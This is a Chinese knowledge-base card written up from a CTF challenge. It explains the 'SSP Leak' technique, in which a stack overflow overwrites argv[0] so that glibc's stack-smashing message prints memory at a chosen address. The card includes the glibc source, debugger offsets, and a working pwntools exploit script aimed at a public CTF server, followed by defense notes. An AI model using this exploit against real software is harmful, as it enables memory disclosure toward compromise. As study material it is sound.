---
id: binary-pwn-stack-ssp-leak-argv0-arbitrary-read
title: SSP Leak：溢出改写栈上 argv[0] 指针，借 __stack_chk_fail→__fortify_fail 打印实现任意地址读
type: scenario
domain: binary
path: binary/pwn/stack
technique: ssp-leak-argv0-pointer-overwrite-arbitrary-read
tags:
- pwn
- stack
- canary
- ssp-leak
- arbitrary-read
- glibc
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V643
  verified_at: '2026-11-13T02:32:54+08:00'
  notes: 原文无图(meta images:0，img目录为空)，全文重读核对：__stack_chk_fail→__fortify_fail→__libc_message 打印 __libc_argv[0] 的源码、Ubuntu20.04/glibc2.31 不输出 argv[0] 的版本限制、main 前 argv[0] 槽 0x7fffffffdeb8 与 gets 前 rsp 0x7fffffffdca0 偏移 0x218、.rodata 备份串 0x400d21、payload 'a'*0x218+p64(flag_addr) 及 p64(addr)*200 变体均与原文一致。3份merge草稿核对成立：format-leak草稿对应已验证 binary-pwn-stack-canary-lowbyte-nul-overwrite-string-leak；fork-bruteforce草稿对应已验证 binary-pwn-stack-fork-canary-bytewise-bruteforce；%hn改stack_chk_fail-GOT草稿对应 ctf-pwn-stack-chk-fail-got-leave-ret-jmp-rsp-shellcode/binary-pwn-stack-stack-chk-fail-got-reenter-vuln-ret-second-overflow-jmp-rsp 与 binary-pwn-format-string-got-hijack，均同场景不另立卡。新卡为SSP Leak独立场景，dedup仅自身，余为related；关联的House of Husk卡正文核实含__stack_chk_fail打印argv[0]例，非重复。未运行PoC复现。
url: /docs/binary/pwn/stack/binary-pwn-stack-ssp-leak-argv0-arbitrary-read/
draft: false
kb_aliases:
- SSP Leak
- Stack Smashing Protect Leak
- argv[0] 任意读
- canary 失败信息泄露
---

## 一句话结论

Canary 校验失败时 `__stack_chk_fail()` 调用 `__fortify_fail("stack smashing detected")`，后者用 `__libc_message` 把 `__libc_argv[0]` 当 `%s` 打印；`__libc_argv` 指向初始栈上的 argv 指针数组，长栈溢出若能覆盖该数组的 `argv[0]` 槽，把它改成任意目标地址，崩溃信息就会打印该地址处的字符串，形成一次任意地址读（SSP Leak）。

## 原理

- glibc 的失败路径（原文引用 eglibc-2.19 `debug/stack_chk_fail.c`）：
  ```c
  void __stack_chk_fail(void) { __fortify_fail("stack smashing detected"); }
  void __fortify_fail(const char *msg) {
      while (1)
          __libc_message(2, "*** %s ***: %s terminated\n",
                         msg, __libc_argv[0] ?: "<unknown>");
  }
  ```
  `__libc_argv` 在 `__libc_start_main` 中被赋值为 `argv`（即初始栈上的 argv 指针数组地址），`__libc_argv[0]` 解引用数组第一个槽得到程序名字符串指针。
- 初始栈上的 argv 数组离 main 的栈帧并不远：只要溢出长度足够越过 canary、saved rbp、返回地址和后续栈数据，就能写到 `argv[0]` 指针槽。把它改成目标地址（如 .rodata 中的 flag 字符串、任意可读地址），canary 校验失败后错误信息里的程序名就变成目标地址处的字符串。
- 因此 SSP Leak 的“写”只用于篡改一个指针，“读”由库函数 `%s` 完成；它不能直接 getshell，但在无法爆破（每次进程 canary 随机、非 fork）也无法常规泄露 canary 的题目里，是获取内存内容的替代通道。
- 版本依赖：原文实测 Ubuntu 20.04 的 glibc 2.31 中 `__fortify_fail` 已不打印 `argv[0]`，需换用仍打印它的旧版 glibc（如原文引用的 2.19）才能复现。

## 触发条件

- 存在可写长度足够大的栈溢出（能覆盖到初始栈上的 argv[0] 槽）；
- 开启了 Canary 且没有泄露/爆破条件；
- 目标 glibc 的 `__fortify_fail` 会输出 `argv[0]`（旧版本，2.31 不输出）；
- 能通过对照调试得到“溢出缓冲区栈顶 → argv[0] 槽”的偏移，以及要读的目标地址。

## 利用步骤

1. 在 main 前断点，记录 `argv[0]` 指针槽地址（如 `0x7fffffffdeb8`）。
2. 在漏洞函数 `gets` 前断点，记录此时 `rsp`（如 `0x7fffffffdca0`），偏移 = `0x7fffffffdeb8 - 0x7fffffffdca0 = 0x218`。
3. 找目标地址：本题 .data 中的提示串 `CTF{Here's the flag on server}` 会被后续写入覆盖，改用 .rodata 里的备份 `0x400d21`（`find CTF` 可定位多处副本）。
4. 发送 `'a'*0x218 + p64(flag_addr)`；程序继续要求“overwrite the flag”，回车触发返回；canary 校验失败，错误信息打印 `0x400d21` 处字符串。
5. 若偏移不确定但溢出长度足够，可用 `p64(flag_addr)*200` 大范围覆盖 argv[0] 槽。

## PoC

```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
p = remote('pwn.jarvisoj.com', 9877)
flag_addr = 0x400d21
payload = 'a'*0x218 + p64(flag_addr)
p.sendlineafter('your name? ', payload)
p.recv()
p.sendline()
p.interactive()
```

## 变体与关联

- 变体：目标地址换成 GOT 表项、libc 地址等，可读取指针值/内存布局；本质是把崩溃信息变成 `%s` 任意读。
- 变体：偏移未知时 `p64(addr)*N` 批量覆盖，靠对齐命中 argv[0] 槽。
- 关联：[[binary-pwn-stack-canary-lowbyte-nul-overwrite-string-leak]]——常规 canary 泄露；SSP Leak 用于无法常规泄露时的内存读。
- 关联：[[binary-pwn-heap-house-of-husk-printf-arginfo-table]]——同样借 `__stack_chk_fail` 打印 `argv[0]` 的用法（House of Husk 中作为示例）。

## 检测与防御

- 修复：升级 glibc（2.31 起 `__fortify_fail` 不再输出 `argv[0]`），从根上关闭该信息泄露。
- 防御：Canary 之外启用 FORTIFY_SOURCE、ASLR，减少栈上敏感数据；崩溃处理不要回显可控指针指向的内容。
- 检测：进程崩溃日志出现 `*** stack smashing detected ***` 且程序名异常（非正常路径/指向非字符串地址）。
